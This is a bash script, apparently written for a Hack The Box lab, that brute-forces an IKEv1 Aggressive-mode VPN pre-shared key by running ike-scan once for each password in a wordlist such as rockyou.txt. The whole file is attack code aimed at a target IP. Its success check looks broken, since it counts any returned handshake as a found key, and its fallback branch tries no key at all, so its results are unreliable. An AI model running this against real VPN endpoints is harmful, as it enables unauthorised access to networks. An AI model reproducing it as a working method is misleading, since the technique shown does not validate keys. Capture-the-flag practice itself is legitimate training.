#!/usr/bin/env bash
# ike_psk_bruteforce.sh
# Simple script to try a list of PSKs against an IKEv1 Aggressive-mode responder
# Requires: ike-scan installed on Kali. Run as root for best results.

set -euo pipefail

if [[ $# -lt 2 ]]; then
  cat <<USAGE
Usage: $0 <target-ip> <wordlist> [id]
Example: $0 10.10.11.87 /usr/share/wordlists/rockyou.txt ike@expressway.htb

Notes:
- This script calls ike-scan for each candidate PSK and checks for a successful handshake.
- ike-scan must support the --psk option on your system. If it doesn't, see the comments below.
USAGE
  exit 1
fi

TARGET="$1"
WORDLIST="$2"
ID="${3:-ike@expressway.htb}"

# Adjust parallelism/sleep to be polite and avoid lockouts
SLEEP=0.4
TIMEOUT=5

command -v ike-scan >/dev/null 2>&1 || { echo "ike-scan not found. Install with: sudo apt update && sudo apt install ike-scan"; exit 2; }

echo "Target: $TARGET"
echo "ID: $ID"
echo "Wordlist: $WORDLIST"

if [[ ! -f "$WORDLIST" ]]; then
  echo "Wordlist not found: $WORDLIST"; exit 3
fi

while IFS= read -r psk || [[ -n "$psk" ]]; do
  # skip empty lines
  [[ -z "$psk" ]] && continue
  # try candidate (ike-scan may accept --psk or --psk=)
  echo -n "Trying PSK: $psk ... "
  # run ike-scan with a short timeout; suppress binary output
  if ike-scan --help 2>&1 | grep -q "--psk"; then
    OUT=$(timeout ${TIMEOUT}s ike-scan --id="$ID" --psk="$psk" -A $TARGET 2>/dev/null || true)
  else
    # fallback: try ike-scan aggressive mode without passing PSK (some versions accept --psk-file or other flags)
    OUT=$(timeout ${TIMEOUT}s ike-scan --id="$ID" -A $TARGET 2>/dev/null || true)
    # NOTE: if ike-scan on your system does not support --psk, install a tool like ikeforce or use a different approach.
  fi

  if echo "$OUT" | grep -qi "returned handshake\|Handshake returned"; then
    echo "FOUND (handshake) -> PSK: $psk"
    echo "Output saved to ike_psk_found_${TARGET}.txt"
    echo "$OUT" > "ike_psk_found_${TARGET}.txt"
    exit 0
  else
    echo "no"
  fi

  sleep $SLEEP

done < "$WORDLIST"

echo "Completed. No PSK found in wordlist."
exit 1

# If your ike-scan doesn't support passing PSKs directly, consider using ikeforce or other tools:
# - ikeforce (Python): https://github.com/jonhosking/ikeforce (may need manual install)
# - Or use an offline cracking approach if you captured Aggressive-mode handshake (requires specialized tools)
# Use responsibly and with permission (HTB rules).
